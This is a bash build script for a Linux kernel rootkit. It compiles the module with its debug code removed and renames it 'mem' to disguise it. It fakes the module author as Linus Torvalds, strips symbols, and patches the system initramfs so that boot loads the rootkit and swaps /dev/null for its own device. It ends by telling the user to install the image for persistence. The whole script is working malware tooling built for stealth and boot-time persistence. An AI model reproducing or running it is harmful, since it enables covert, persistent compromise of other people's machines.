#!/bin/env bash

outdir="build"
password_len=12
password="$(openssl rand -hex $password_len)"
device_name="mem"

rm -rf "$outdir"
mkdir -p "$outdir"

cp rootkit.c "$outdir"
cp Makefile "$outdir"

sed -i "s/#define DEBUG .*/#define DEBUG 0/g" "$outdir/rootkit.c"
sed -i "s/MODULE_AUTHOR(\".*\")/MODULE_AUTHOR(\"Linus Torvalds\")/g" "$outdir/rootkit.c"
sed -i "s/RK_PASSWORD \".*\"/RK_PASSWORD \"$password\"/g" "$outdir/rootkit.c"
sed -i "s/RK_PASSWORD_LEN .*/RK_PASSWORD_LEN $(($password_len * 2))/g" "$outdir/rootkit.c"
sed -i "s/RK_DEVICE_NAME \".*\"/RK_DEVICE_NAME \"$device_name\"/g" "$outdir/rootkit.c"
mv "$outdir/rootkit.c" "$outdir/tmp_rootkit.c"
unifdef -UDEBUG "$outdir/tmp_rootkit.c" > "$outdir/rootkit.c"
rm "$outdir/tmp_rootkit.c"

mv "$outdir/rootkit.c" "$outdir/$device_name.c"
sed -i "s/obj-m += rootkit.o/obj-m += $device_name.o/g" "$outdir/Makefile"
cd "$outdir" && make && cd -
strip --strip-debug "$outdir/$device_name.ko"

mkdir "$outdir/initramfs" && cd "$outdir/initramfs" && lsinitcpio -x /boot/initramfs-linux.img && cd -
cp "$outdir/$device_name.ko" "$outdir/initramfs"
find_device_id="while IFS= read -r line\ndo\n\tcase \$line in\n\t\t*mem*)\n\t\t\tdevice=\$(echo \$line \| cut -d' ' -f1)\n\t\t;;\n\tesac\ndone < /proc/devices"
sed -i "s|rdlogger_stop|rdlogger_stop\ninsmod /$device_name.ko\n$find_device_id\nrm -rf /dev/null\nmknod -m 666 /dev/null c \"\$device\" 1|g" "$outdir/initramfs/init"
cd "$outdir/initramfs" && find -mindepth 1 -printf '%P\0' | LANG=C bsdcpio -0 -o -H newc --quiet | gzip > ../initramfs-linux.img && cd -

echo "password: $password" > "$outdir/config.txt"
echo "Your rootkit password is: $password"
echo "You can now copy build/initramfs-linux.img to /boot/initramfs-linux.img to gain rootkit persistence."
